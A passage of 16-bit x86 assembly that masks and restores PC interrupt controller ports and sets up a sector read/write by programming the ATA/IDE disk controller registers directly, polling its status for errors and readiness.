			mov	level0_port21, al
			in	al, 0A1h
			mov	level0_portA1, al
			mov	al, 0FFh
			out	21h, al
			out	0A1h, al
			ret

io_unmask:		mov	al, level0_port21
			out	21h, al
			mov	al, level0_portA1
			out	0A1h, al
			ret

level0_rw:		call	level0_getcmdport

__1:			in	al, dx
			test	al, 00000001b
			jnz	__error
			test	al, 10000000b
			jnz	__1

			sub	dl, 5		; sector count
			mov	al, byte ptr level0_count
			out	dx, al

			inc	dx		; sector
			mov	al, byte ptr level0_sector
			out	dx, al

			inc	dx		; cylinder - lo
			mov	ax, level0_cylinder
			out	dx, al

			inc	dx		; cylinder - hi
			mov	al, ah
			out	dx, al

			inc	dx		; drive #
			call	level0_calcdrive
			or	al, byte ptr level0_head
			out	dx, al

			inc	dx		; ready
__2:			in	al, dx
			test	al, 00000001b
			jnz	__error
			test	al, 01000000b
			jz	__2

			clc
			ret

__error:		stc
			ret

